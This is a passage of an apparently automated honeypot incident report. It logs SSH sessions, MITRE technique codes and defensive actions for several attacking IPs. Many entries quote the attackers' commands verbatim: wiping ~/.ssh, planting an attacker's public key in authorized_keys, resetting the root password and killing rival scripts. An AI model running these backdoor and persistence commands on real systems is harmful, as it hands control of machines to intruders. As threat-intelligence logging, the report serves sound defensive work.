| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 19:54:05` | `cowrie.session.connect` |
| `2026-05-23 19:54:05` | `cowrie.client.version` |
| `2026-05-23 19:54:05` | `cowrie.client.kex` |
| `2026-05-23 19:54:06` | `cowrie.login.success` |
| `2026-05-23 19:54:06` | `cowrie.session.params` |
| `2026-05-23 19:54:06` | `cowrie.command.input` |
| `2026-05-23 19:54:06` | `cowrie.command.failed` |
| `2026-05-23 19:54:07` | `cowrie.log.closed` |
| `2026-05-23 19:54:07` | `cowrie.session.params` |
| `2026-05-23 19:54:07` | `cowrie.command.input` |
| `2026-05-23 19:54:07` | `cowrie.session.file_download` |
| `2026-05-23 19:54:07` | `cowrie.log.closed` |
| `2026-05-23 19:54:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `100.54.149[.]28` to AbuseIPDB if not already reported
- [ ] Block `100.54.149[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba5213d16190

| Field | Detail |
|---|---|
| **Source IP** | `100.54.149[.]28` |
| **First Seen** | 2026-05-23 19:54 |
| **Last Seen** | 2026-05-23 19:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 19:54:10` | `cowrie.session.connect` |
| `2026-05-23 19:54:10` | `cowrie.client.version` |
| `2026-05-23 19:54:10` | `cowrie.client.kex` |
| `2026-05-23 19:54:11` | `cowrie.login.success` |
| `2026-05-23 19:54:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `100.54.149[.]28` to AbuseIPDB if not already reported
- [ ] Block `100.54.149[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dee93fed5c5a

| Field | Detail |
|---|---|
| **Source IP** | `100.54.149[.]28` |
| **First Seen** | 2026-05-23 20:00 |
| **Last Seen** | 2026-05-23 20:00 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 20:00:21` | `cowrie.session.connect` |
| `2026-05-23 20:00:21` | `cowrie.client.version` |
| `2026-05-23 20:00:21` | `cowrie.client.kex` |
| `2026-05-23 20:00:22` | `cowrie.login.success` |
| `2026-05-23 20:00:22` | `cowrie.session.params` |
| `2026-05-23 20:00:22` | `cowrie.command.input` |
| `2026-05-23 20:00:22` | `cowrie.command.failed` |
| `2026-05-23 20:00:23` | `cowrie.log.closed` |
| `2026-05-23 20:00:23` | `cowrie.session.params` |
| `2026-05-23 20:00:23` | `cowrie.command.input` |
| `2026-05-23 20:00:23` | `cowrie.session.file_download` |
| `2026-05-23 20:00:23` | `cowrie.log.closed` |
| `2026-05-23 20:00:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `100.54.149[.]28` to AbuseIPDB if not already reported
- [ ] Block `100.54.149[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4aee1ba44067

| Field | Detail |
|---|---|
| **Source IP** | `100.54.149[.]28` |
| **First Seen** | 2026-05-23 20:00 |
| **Last Seen** | 2026-05-23 20:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 20:00:26` | `cowrie.session.connect` |
| `2026-05-23 20:00:26` | `cowrie.client.version` |
| `2026-05-23 20:00:26` | `cowrie.client.kex` |
| `2026-05-23 20:00:27` | `cowrie.login.success` |
| `2026-05-23 20:00:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `100.54.149[.]28` to AbuseIPDB if not already reported
- [ ] Block `100.54.149[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0816724532ba

| Field | Detail |
|---|---|
| **Source IP** | `100.54.149[.]28` |
| **First Seen** | 2026-05-23 20:03 |
| **Last Seen** | 2026-05-23 20:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 20:03:31` | `cowrie.session.connect` |
| `2026-05-23 20:03:31` | `cowrie.client.version` |
| `2026-05-23 20:03:32` | `cowrie.client.kex` |
| `2026-05-23 20:03:32` | `cowrie.login.success` |
| `2026-05-23 20:03:33` | `cowrie.session.params` |
| `2026-05-23 20:03:33` | `cowrie.command.input` |
| `2026-05-23 20:03:33` | `cowrie.command.failed` |
| `2026-05-23 20:03:33` | `cowrie.log.closed` |
| `2026-05-23 20:03:33` | `cowrie.session.params` |
| `2026-05-23 20:03:34` | `cowrie.command.input` |
| `2026-05-23 20:03:34` | `cowrie.session.file_download` |
| `2026-05-23 20:03:34` | `cowrie.log.closed` |
| `2026-05-23 20:03:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `100.54.149[.]28` to AbuseIPDB if not already reported
- [ ] Block `100.54.149[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a09579b10c86

| Field | Detail |
|---|---|
| **Source IP** | `100.54.149[.]28` |
| **First Seen** | 2026-05-23 20:03 |
| **Last Seen** | 2026-05-23 20:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 20:03:36` | `cowrie.session.connect` |
| `2026-05-23 20:03:36` | `cowrie.client.version` |
| `2026-05-23 20:03:36` | `cowrie.client.kex` |
| `2026-05-23 20:03:37` | `cowrie.login.success` |
| `2026-05-23 20:03:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `100.54.149[.]28` to AbuseIPDB if not already reported
- [ ] Block `100.54.149[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83a9828c8a68

| Field | Detail |
|---|---|
| **Source IP** | `100.54.149[.]28` |
| **First Seen** | 2026-05-23 20:06 |
| **Last Seen** | 2026-05-23 20:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 20:06:48` | `cowrie.session.connect` |
| `2026-05-23 20:06:48` | `cowrie.client.version` |
| `2026-05-23 20:06:48` | `cowrie.client.kex` |
| `2026-05-23 20:06:49` | `cowrie.login.success` |
| `2026-05-23 20:06:49` | `cowrie.session.params` |
| `2026-05-23 20:06:49` | `cowrie.command.input` |
| `2026-05-23 20:06:49` | `cowrie.command.failed` |
| `2026-05-23 20:06:50` | `cowrie.log.closed` |
| `2026-05-23 20:06:50` | `cowrie.session.params` |
| `2026-05-23 20:06:50` | `cowrie.command.input` |
| `2026-05-23 20:06:50` | `cowrie.session.file_download` |
| `2026-05-23 20:06:50` | `cowrie.log.closed` |
| `2026-05-23 20:06:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `100.54.149[.]28` to AbuseIPDB if not already reported
- [ ] Block `100.54.149[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91549041a619

| Field | Detail |
|---|---|
| **Source IP** | `100.54.149[.]28` |
| **First Seen** | 2026-05-23 20:06 |
| **Last Seen** | 2026-05-23 20:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 20:06:53` | `cowrie.session.connect` |
| `2026-05-23 20:06:53` | `cowrie.client.version` |
| `2026-05-23 20:06:53` | `cowrie.client.kex` |
| `2026-05-23 20:06:54` | `cowrie.login.success` |
| `2026-05-23 20:06:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `100.54.149[.]28` to AbuseIPDB if not already reported
- [ ] Block `100.54.149[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9995e1f59918

| Field | Detail |
|---|---|
| **Source IP** | `120.48.175[.]122` |
| **First Seen** | 2026-05-23 20:22 |
| **Last Seen** | 2026-05-23 20:22 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 20:22:39` | `cowrie.session.connect` |
| `2026-05-23 20:22:39` | `cowrie.client.version` |
| `2026-05-23 20:22:39` | `cowrie.client.kex` |
| `2026-05-23 20:22:41` | `cowrie.login.success` |
| `2026-05-23 20:22:42` | `cowrie.session.params` |
| `2026-05-23 20:22:42` | `cowrie.command.input` |
| `2026-05-23 20:22:42` | `cowrie.command.failed` |
| `2026-05-23 20:22:42` | `cowrie.log.closed` |
| `2026-05-23 20:22:42` | `cowrie.session.params` |
| `2026-05-23 20:22:42` | `cowrie.command.input` |
| `2026-05-23 20:22:42` | `cowrie.session.file_download` |
| `2026-05-23 20:22:42` | `cowrie.log.closed` |
| `2026-05-23 20:22:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.175[.]122` to AbuseIPDB if not already reported
- [ ] Block `120.48.175[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14972a96c7ef

| Field | Detail |
|---|---|
| **Source IP** | `120.48.175[.]122` |
| **First Seen** | 2026-05-23 20:22 |
| **Last Seen** | 2026-05-23 20:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 20:22:49` | `cowrie.session.connect` |
| `2026-05-23 20:22:49` | `cowrie.client.version` |
| `2026-05-23 20:22:50` | `cowrie.client.kex` |
| `2026-05-23 20:22:51` | `cowrie.login.success` |
| `2026-05-23 20:22:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.175[.]122` to AbuseIPDB if not already reported
- [ ] Block `120.48.175[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15474fd06957

| Field | Detail |
|---|---|
| **Source IP** | `120.48.175[.]122` |
| **First Seen** | 2026-05-23 20:31 |
| **Last Seen** | 2026-05-23 20:33 |
| **Session Duration** | 101s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:W0cfjLj4Y2gq"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 20:31:59` | `cowrie.session.connect` |
| `2026-05-23 20:31:59` | `cowrie.client.version` |
| `2026-05-23 20:32:02` | `cowrie.client.kex` |
| `2026-05-23 20:32:03` | `cowrie.login.success` |
| `2026-05-23 20:32:03` | `cowrie.session.params` |
| `2026-05-23 20:32:03` | `cowrie.command.input` |
| `2026-05-23 20:32:03` | `cowrie.command.failed` |
| `2026-05-23 20:32:05` | `cowrie.log.closed` |
| `2026-05-23 20:32:05` | `cowrie.session.params` |
| `2026-05-23 20:32:05` | `cowrie.command.input` |
| `2026-05-23 20:32:05` | `cowrie.session.file_download` |
| `2026-05-23 20:32:05` | `cowrie.log.closed` |
| `2026-05-23 20:32:18` | `cowrie.session.params` |
| `2026-05-23 20:32:18` | `cowrie.command.input` |
| `2026-05-23 20:32:18` | `cowrie.log.closed` |
| `2026-05-23 20:32:18` | `cowrie.session.params` |
| `2026-05-23 20:32:18` | `cowrie.command.input` |
| `2026-05-23 20:32:20` | `cowrie.log.closed` |
| `2026-05-23 20:32:20` | `cowrie.session.params` |
| `2026-05-23 20:32:20` | `cowrie.command.input` |
| `2026-05-23 20:32:21` | `cowrie.session.file_download` |
| `2026-05-23 20:32:21` | `cowrie.log.closed` |
| `2026-05-23 20:32:28` | `cowrie.session.params` |
| `2026-05-23 20:32:28` | `cowrie.command.input` |
| `2026-05-23 20:32:28` | `cowrie.log.closed` |
| `2026-05-23 20:32:40` | `cowrie.session.params` |
| `2026-05-23 20:32:40` | `cowrie.command.input` |
| `2026-05-23 20:32:46` | `cowrie.log.closed` |
| `2026-05-23 20:33:01` | `cowrie.session.params` |
| `2026-05-23 20:33:01` | `cowrie.command.input` |
| `2026-05-23 20:33:01` | `cowrie.log.closed` |
| `2026-05-23 20:33:03` | `cowrie.session.params` |
| `2026-05-23 20:33:03` | `cowrie.command.input` |
| `2026-05-23 20:33:12` | `cowrie.log.closed` |
| `2026-05-23 20:33:40` | `cowrie.session.params` |
| `2026-05-23 20:33:40` | `cowrie.command.input` |
| `2026-05-23 20:33:40` | `cowrie.log.closed` |
| `2026-05-23 20:33:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.175[.]122` to AbuseIPDB if not already reported
- [ ] Block `120.48.175[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efe182e39f62

| Field | Detail |
|---|---|
| **Source IP** | `120.48.175[.]122` |
| **First Seen** | 2026-05-23 20:36 |
| **Last Seen** | 2026-05-23 20:37 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:vjdMEcQJUUyH"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 20:36:37` | `cowrie.session.connect` |
| `2026-05-23 20:36:37` | `cowrie.client.version` |
| `2026-05-23 20:36:38` | `cowrie.client.kex` |
| `2026-05-23 20:36:39` | `cowrie.login.success` |
| `2026-05-23 20:36:40` | `cowrie.session.params` |
| `2026-05-23 20:36:40` | `cowrie.command.input` |
| `2026-05-23 20:36:40` | `cowrie.command.failed` |
| `2026-05-23 20:36:40` | `cowrie.log.closed` |
| `2026-05-23 20:36:41` | `cowrie.session.params` |
| `2026-05-23 20:36:41` | `cowrie.command.input` |
| `2026-05-23 20:36:41` | `cowrie.session.file_download` |
| `2026-05-23 20:36:41` | `cowrie.log.closed` |
| `2026-05-23 20:36:55` | `cowrie.session.params` |
| `2026-05-23 20:36:55` | `cowrie.command.input` |
| `2026-05-23 20:36:56` | `cowrie.log.closed` |
| `2026-05-23 20:36:56` | `cowrie.session.params` |
| `2026-05-23 20:36:56` | `cowrie.command.input` |
| `2026-05-23 20:36:57` | `cowrie.log.closed` |
| `2026-05-23 20:36:59` | `cowrie.session.params` |
| `2026-05-23 20:36:59` | `cowrie.command.input` |
| `2026-05-23 20:36:59` | `cowrie.session.file_download` |
| `2026-05-23 20:36:59` | `cowrie.log.closed` |
| `2026-05-23 20:37:02` | `cowrie.session.params` |
| `2026-05-23 20:37:02` | `cowrie.command.input` |
| `2026-05-23 20:37:02` | `cowrie.log.closed` |
| `2026-05-23 20:37:04` | `cowrie.session.params` |
| `2026-05-23 20:37:04` | `cowrie.command.input` |
| `2026-05-23 20:37:05` | `cowrie.log.closed` |
| `2026-05-23 20:37:10` | `cowrie.session.params` |
| `2026-05-23 20:37:10` | `cowrie.command.input` |
| `2026-05-23 20:37:10` | `cowrie.command.input` |
| `2026-05-23 20:37:11` | `cowrie.log.closed` |
| `2026-05-23 20:37:11` | `cowrie.session.params` |
| `2026-05-23 20:37:11` | `cowrie.command.input` |
| `2026-05-23 20:37:11` | `cowrie.log.closed` |
| `2026-05-23 20:37:12` | `cowrie.session.params` |
| `2026-05-23 20:37:12` | `cowrie.command.input` |
| `2026-05-23 20:37:12` | `cowrie.log.closed` |
| `2026-05-23 20:37:12` | `cowrie.session.params` |
| `2026-05-23 20:37:12` | `cowrie.command.input` |
| `2026-05-23 20:37:13` | `cowrie.log.closed` |
| `2026-05-23 20:37:15` | `cowrie.session.params` |
| `2026-05-23 20:37:15` | `cowrie.command.input` |
| `2026-05-23 20:37:15` | `cowrie.log.closed` |
| `2026-05-23 20:37:16` | `cowrie.session.params` |
| `2026-05-23 20:37:16` | `cowrie.command.input` |
| `2026-05-23 20:37:16` | `cowrie.log.closed` |
| `2026-05-23 20:37:18` | `cowrie.session.params` |
| `2026-05-23 20:37:18` | `cowrie.command.input` |
| `2026-05-23 20:37:18` | `cowrie.log.closed` |
| `2026-05-23 20:37:19` | `cowrie.session.params` |
| `2026-05-23 20:37:19` | `cowrie.command.input` |
| `2026-05-23 20:37:19` | `cowrie.log.closed` |
| `2026-05-23 20:37:20` | `cowrie.session.params` |
| `2026-05-23 20:37:20` | `cowrie.command.input` |
| `2026-05-23 20:37:21` | `cowrie.log.closed` |
| `2026-05-23 20:37:22` | `cowrie.session.params` |
| `2026-05-23 20:37:22` | `cowrie.command.input` |
| `2026-05-23 20:37:22` | `cowrie.log.closed` |
| `2026-05-23 20:37:23` | `cowrie.session.params` |
| `2026-05-23 20:37:23` | `cowrie.command.input` |
| `2026-05-23 20:37:23` | `cowrie.log.closed` |
| `2026-05-23 20:37:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.175[.]122` to AbuseIPDB if not already reported
- [ ] Block `120.48.175[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `14.1.16[.]230` | **74** | 2026-05-23 19:15 | 2026-05-23 20:57 | 55m | 0 | `T1592` | 🟠 MEDIUM |
| `223.123.35[.]46` | **25** | 2026-05-23 19:32 | 2026-05-23 19:37 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `120.48.175[.]122` | **17** | 2026-05-23 20:12 | 2026-05-23 20:52 | 25m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `100.54.149[.]28` | **15** | 2026-05-23 19:21 | 2026-05-23 20:06 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.114[.]89` | **3** | 2026-05-23 19:27 | 2026-05-23 19:35 | 6m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.148.120[.]187` | **2** | 2026-05-23 19:53 | 2026-05-23 20:29 | 1m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]104` | **2** | 2026-05-23 19:38 | 2026-05-23 19:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.18[.]30` | 1 | 2026-05-23 19:31 | 2026-05-23 19:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.126.53[.]14` | 1 | 2026-05-23 19:38 | 2026-05-23 19:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `110.141.36[.]77` | 1 | 2026-05-23 20:48 | 2026-05-23 20:48 | 12s | 0 | `T1592` | 🟢 LOW |
| `115.190.216[.]185` | 1 | 2026-05-23 19:24 | 2026-05-23 19:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `147.45.135[.]69` | 1 | 2026-05-23 19:19 | 2026-05-23 19:19 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `177.124.14[.]235` | 1 | 2026-05-23 20:14 | 2026-05-23 20:16 | 120s | 0 | `T1592` | 🟢 LOW |
